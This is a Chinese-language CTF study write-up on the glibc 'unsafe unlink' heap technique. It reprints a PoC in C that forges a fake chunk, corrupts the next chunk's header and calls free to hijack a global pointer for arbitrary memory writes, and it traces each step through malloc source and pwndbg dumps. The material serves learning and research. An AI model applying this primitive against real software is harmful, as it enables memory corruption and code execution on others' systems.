# 前言
这一小节我们再次说明unsafe unlink这种攻击方式，为什么是再次说明？因为这种利用方式我们之前说过，但仍然是模棱两可（好吧，我承认当时完全没有看懂，这也就是我再看一遍漏洞的原因）：

[PWN入门（3-5-1）- unsortedbin的unlink（基础）](https://www.yuque.com/cyberangel/rg9gdm/kebg96)

[PWN入门（3-5-2）- unsortedbin的unlink（例题）](https://www.yuque.com/cyberangel/rg9gdm/yki7ng)

在这片文章中我们将结合malloc源码进行重新分析。

# 影响版本
所有glibc malloc

# POC
## POC源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 18.04.4 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}
```

## POC调试
在POC的开头我们首先申请了mchunk_size为0x431的堆块，这样申请的原因是防止在后续free的过程中进入让堆块进入到tcachebin中给自己造成一些不必要的麻烦：

```c
	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

#printf
//The global chunk0_ptr is at 0x555555756020, pointing to 0x555555757260
//The victim chunk we are going to corrupt is at 0x555555757690
//全局变量chunk0_ptr在程序的data段，这个指针指向堆区中所申请的堆块
//现在将申请到的chunk1_ptr指向的堆块当作victim，我们让他在后续的过程中出现异常
//chunk0_ptr在程序的data段，chunk1_ptr在stack上
```

```c
pwndbg> x/6gx &chunk0_ptr 
0x555555756020 <chunk0_ptr>:	0x0000555555757260	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
pwndbg> x/6gx &chunk1_ptr 
0x7fffffffdd90:	0x0000555555757690	0x0000555555554750
    								#与POC无关
......
pwndbg> 
```

```c
pwndbg>  x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000431 #chunk0
......
0x555555757680:	0x0000000000000000	0x0000000000000431 #chunk1
......
0x555555757ab0:	0x0000000000000000	0x0000000000020551 #top_chunk
......
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

现在chunk0处于malloc状态，正常情况下我们可以修改其user_data：

> 注意：这里使用fd_nextsize和bk_nextsize来表示的是修改的位置，本步和后续步骤与fd_nextsize和bk_nextsize这两个堆块指针均无关。
>

```c
	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
//We create a fake chunk inside chunk0.
//We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
//We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
//With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
//Fake chunk fd: 0x555555756008
//Fake chunk bk: 0x555555756010
```

执行结果如下：

```c
pwndbg> x/6gx &chunk0_ptr 
0x555555756020 <chunk0_ptr>:	0x0000555555757260	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
pwndbg> x/6gx &chunk1_ptr 
0x7fffffffdd90:	0x0000555555757690	0x0000555555554750
    								#与POC无关
......
pwndbg> 
//未发生变化
```

```c
pwndbg>  x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000431 #chunk0
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000555555756008	0x0000555555756010
    			#fake_chunk_fd		#fake_chunk_bk
......
0x555555757680:	0x0000000000000000	0x0000000000000431 #chunk1
......
0x555555757ab0:	0x0000000000000000	0x0000000000020551 #top_chunk
......
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

现在我们通过堆溢出漏洞修改chunk1堆块的mchunk_prev_size和mchunk_size：

```c
	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

//pwndbg> p/x chunk1_ptr - header_size
//$1 = 0x555555757680
//pwndbg> 
```

执行结果如下：

```c
pwndbg> x/6gx &chunk0_ptr 
0x555555756020 <chunk0_ptr>:	0x0000555555757260	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
pwndbg> x/6gx &chunk1_ptr 
0x7fffffffdd90:	0x0000555555757690	0x0000555555757680
    								#&chunk1_hdr==0x555555757680
    	                 #uint64_t *chunk1_hdr = chunk1_ptr - header_size;
......
pwndbg> 
//未发生变化
```

```c
pwndbg>  x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000431 #chunk0
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000555555756008	0x0000555555756010
    			#fake_chunk_fd		#fake_chunk_bk
......
//chunk1_hdr->:	0x0000000000000420	0x0000000000000430 #chunk1
		  #chunk1_hdr[0] = malloc_size  #chunk1_hdr[1] &= ~1
......
0x555555757ab0:	0x0000000000000000	0x0000000000020551 #top_chunk
......
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

下面是POC的关键步骤：unlink，这里我们要释放掉chunk1，这里我们选择引入malloc源码进行调试，来到_int_free函数中：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620651239934-48e67770-e42f-40bc-9f58-79473ba84bb1.png)一直单步到“向后合并”，看一下这里的源码：

```c
    /* consolidate backward */ //向后合并
    if (!prev_inuse(p)) { //prev_inuse(p)==0
        //进入if语句
      prevsize = prev_size (p); //prevsize==mchunk_prev_size==0x420
      size += prevsize; //size==size+prevsize==0x420+0x430==0x850
        	//p==0x555555757680
      p = chunk_at_offset(p, -((long) prevsize));
        //p==0x555555757680-0x420==0x555555757260
      unlink(av, p, bck, fwd);
    }
```

> 向前合并向后合并的概念参见：
>

[how2heap(6)-poison_null_byte](https://www.yuque.com/cyberangel/lc795f/izypw7)

---

> 以下内容是文章完成之后补充的，第一次阅读时可以现将这部分跳过，等阅读完文章之后再来看这些内容
>

Q：为什么要让prevsize==0x420而不是0x430？

这里应该考虑了在之后top_chunk向前吞并后，我们可以通过chunk0控制top_chunk的size从而使用house of force，另外避免在unlink的过程中造成段错误：

```c
    /* consolidate backward */
    if (!prev_inuse(p)) { //prev_inuse(p)==0
        //进入if
      prevsize = prev_size (p); //prevsize==0x430
      size += prevsize; //size==size+prevsize==0x430+0x430==0x860 
        				//这里代码没有问题，但是prevsize会触发之后的段错误
        				//p==0x555555757680
      p = chunk_at_offset(p, -((long) prevsize)); 
        		//p==0x555555757680-0x860==0x555555756e20（WARNING：这个地址不在堆区中）
      unlink(av, p, bck, fwd);
    }
#pwndbg> x/16gx 0x555555756e20-0x10
#0x555555756e10:	0x0000000000000000	0x0000000000000000
#0x555555756e20:	0x0000000000000000	0x0000000000000000 （P）
#0x555555756e30:	0x0000000000000000	0x0000000000000000
#0x555555756e40:	0x0000000000000000	0x0000000000000000
#0x555555756e50:	0x0000000000000000	0x0000000000000000
#0x555555756e60:	0x0000000000000000	0x0000000000000000
#0x555555756e70:	0x0000000000000000	0x0000000000000000
#0x555555756e80:	0x0000000000000000	0x0000000000000000
#pwndbg> 
----------------------------------------------------------
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))   【检查1】
    	//chunksize(P)==0x0;
        //next_chunk(P)==0x555555756e10+0x0==0x555555756e10
        //prev_size (next_chunk(P))==0x0
        //因此可以通过第一个检查
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;	//FD==NULL						      
    BK = P->bk;	//BK==NULL									      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))	【检查2】
    	//FD->bk==NULL->bk会造成内存访问异常导致段错误
      malloc_printerr ("corrupted double-linked list");			      
    else {								      
        //省略有关于largebin的代码......							      
      }									      
}
```

```c
pwndbg>  x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000431 #chunk0
#p----------->:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000555555756008	0x0000555555756010
    			#fake_chunk_fd		#fake_chunk_bk
......
//chunk1_hdr->:	0x0000000000000430	0x0000000000000430 #chunk1
                #原来这里是0x420
		  #chunk1_hdr[0] = malloc_size  #chunk1_hdr[1] &= ~1
......
0x555555757ab0:	0x0000000000000000	0x0000000000020551 #top_chunk
......
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

这种大小设置太妙了，但是只针对glibc 2.29版本以下有效：

另外这里我们在多提几句，poison null byte和本文的unsafe unlink都利用了堆块向后合并没有检查的问题：都没有检查chunksize(p)与prevsize是否相等：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620700969914-52498156-dbc9-4230-a606-9a6221be560d.png)

额，在unsafe unlink中因为chunk0是处于malloc状态的，我们直接修改其对应地址为0x420就行了，23333。

poison null byte不太好绕过这个检查，碰见再说吧。

---

回到正题：

这里由于chunk1的PREV_INUSE为0，导致在释放chunk1时误认为前面的chunk0也处于释放状态，这时会根据chunk1的mchunk_prev_size标志位进行向后合并。在unlink之前的内存如下：

```c
pwndbg>  x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000431 #chunk0
#p----------->:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000555555756008	0x0000555555756010
    			#fake_chunk_fd		#fake_chunk_bk
......
//chunk1_hdr->:	0x0000000000000420	0x0000000000000430 #chunk1
		  #chunk1_hdr[0] = malloc_size  #chunk1_hdr[1] &= ~1
......
0x555555757ab0:	0x0000000000000000	0x0000000000020551 #top_chunk
......
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

现在开始进行unlink，宏代码如下：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))   【检查1】   
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;								      
    BK = P->bk;								      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))	【检查2】	      
      malloc_printerr ("corrupted double-linked list");			      
    else {								      
        //省略有关于largebin的代码......							      
      }									      
}
```

这里再回顾一下unlink的检查机制，首先先看【检查1】：

+ chunksize(P)==0x0
+ prev_size (next_chunk(P))==prev_size (P)==0x0

所以chunksize(P)==prev_size (next_chunk(P))可以绕过【检查1】

然后：

FD = P->fd==fake_chunk_fd==0x0000555555756008

BK = P->bk==fake_chunk_bk==0x0000555555756010

```c
pwndbg> x/6gx &chunk0_ptr 
0x555555756020 <chunk0_ptr>:	0x0000555555757260	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
pwndbg> x/6gx &chunk1_ptr 
0x7fffffffdd90:	0x0000555555757690	0x0000555555757680
    								#&chunk1_hdr==0x555555757680
    	                 #uint64_t *chunk1_hdr = chunk1_ptr - header_size;
......
pwndbg> x/16gx 0x0000555555756010
0x555555756010 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dce760	0x0000000000000000
0x555555756020 <chunk0_ptr>:	0x0000555555757260	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756008
0x555555756008:	0x0000555555756008	0x00007ffff7dce760
0x555555756018 <completed.7698>:	0x0000000000000000	0x0000555555757260
......
0x555555756078:	0x0000000000000000	0x0000000000000000
```

再来看【检查2】：__builtin_expect (FD->bk != P || BK->fd != P, 0)：

+ FD->bk==fake_chunk_fd->bk==0x0000555555757260==P
+ BK->fd== fake_chunk_bk->fd==0x0000555555757260==P

因此可以绕过【检查2】，绕过这两个检查之后开始对堆块进行unlink：

首先执行FD->bk = BK;这个式子等价于：0x0000555555756008->bk=0x0000555555756010，执行完毕后内存状况如下：

```c
pwndbg> x/16gx 0x555555756008 
0x555555756008:	0x0000555555756008	0x00007ffff7dce760
0x555555756018 <completed.7698>:	0x0000000000000000	0x0000555555756010
    												   #0x0000555555757260
......
0x555555756078:	0x0000000000000000	0x0000000000000000
```

然后执行BK->fd = FD;等价于：0x0000555555756010->fd=0x0000555555756008

```c
pwndbg> x/16gx 0x0000555555756010
0x555555756010 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dce760	0x0000000000000000
0x555555756020 <chunk0_ptr>:	0x0000555555756008	0x0000000000000000
    						   #0x0000555555756010
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

**<font style="color:#F5222D;">Warning：现在chunk0_ptr的指针已经被篡改，这个指针已经指向了程序的data段。</font>**

```c
    if (nextchunk != av->top) { //判断nextchunk是否是top_chunk，这里很明显是
      //......
    }

    /*
      If the chunk borders the current high end of memory,
      consolidate into top
    */

    else { //进入else分支,top_chunk向低地址吞并
      size += nextsize; //size==size+nextsize==0x420+0x20550==0x20970
      set_head(p, size | PREV_INUSE);
      av->top = p;
      check_chunk(av, p);
    }
```

```c
pwndbg>  x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000431 #chunk0
#p----------->:	0x0000000000000000	0x0000000000020da1 #top_chunk
									#set_head(p, size | PREV_INUSE)
0x555555757270:	0x0000555555756008	0x0000555555756010
    			#fake_chunk_fd		#fake_chunk_bk
......
//chunk1_hdr->:	0x0000000000000420	0x0000000000000430 #chunk1（free）
		  #chunk1_hdr[0] = malloc_size  #chunk1_hdr[1] &= ~1
......
0x555555757ab0:	0x0000000000000000	0x0000000000020551 
......
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

注意，现在top_chunk已经向前移动到我们伪造的p位置，但是chunk0仍然处于malloc状态，因此现在我们可以任意的修改top_chunk的值，在小于glibc 2.29的版本中可以使用上一小节的house of force。

既然chunk0_ptr已经被篡改，所指向的地方已经可控，我们来看一下最终的效果：

```c
	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string; #向chunk0_ptr[3]处写入"Hello!~"
```

```c
pwndbg> x/16gx 0x0000555555756010
0x555555756010 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dce760	0x0000000000000000
0x555555756020 <chunk0_ptr>:	0x00007fffffffdda0	0x0000000000000000
    						   #0x0000555555756008
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

上述步骤修改了chunk0_ptr的指针为栈上的地址（这个地址是我们想要控制的地址）：0x00007fffffffdda0，然后向xchunk0_ptr中写入了"Hello!~"字符串：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620694437429-b6ab42db-33a9-4743-83a4-0ad83366fbfb.png)

```c
	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620694574445-9df169ee-05ff-4c8a-9ce7-6414c3564100.png)

# 利用总结
接下来我们总结一下这个POC以便于在CTF时可以直接拿来使用，但还是要具体情况具体分析：

1、  首先我们创建了两个堆块大小超过放入tcachebin的堆块：chunk0、chunk1

chunk0指针存放在地址0x555555756020（data段）

chunk0指针指向chunk0的user_data：0x0000555555757260

chunk1指针存放在地址0x7fffffffdd90(stack段)

chunk1指针指向chunk1的user_data：0x0000555555757690

2、然后我们在chunk0的起始地址+0x20处（也就是fd_nextsize和bk_nextsize所在的地方）伪造两个指针，当然这个指针的地址也是有要求的：相差0x8。（POC中这两个指针分别为0x555555756008和0x555555756010）。注意：这两个指针可不是随便伪造的，它们可不是乱来的：只需在地址0x555555756008+0x18处写入值chunk0的user_data地址（这个我们要伪造的堆块的起始地址）0x555555757260即可。

> 这里其实反着来更好，先找要写入的地方，再倒推两个伪造的指针地址。
>

3、然后通过堆溢出将chunk1的mchunk_prev_size和mchunk_size分别设置为chunk0_mchunk_size-0x11和chunk1_mchunk_size-0x1。

4、之后我们free掉chunk1，free时会发生unlink和向后合并导致top_chunk向前吞并，现在chunk0已经可以控制到top_chunk；另外，free此堆块后现在从地址0x555555756008开始的内容已经可以被控制（注意：chunk0指针存放在地址0x555555756020，也就是说chunk0_ptr指针可以被控制），我们将chunk0_ptr指针的指向修改为想要控制的地方，修改后即可控制那片内存。

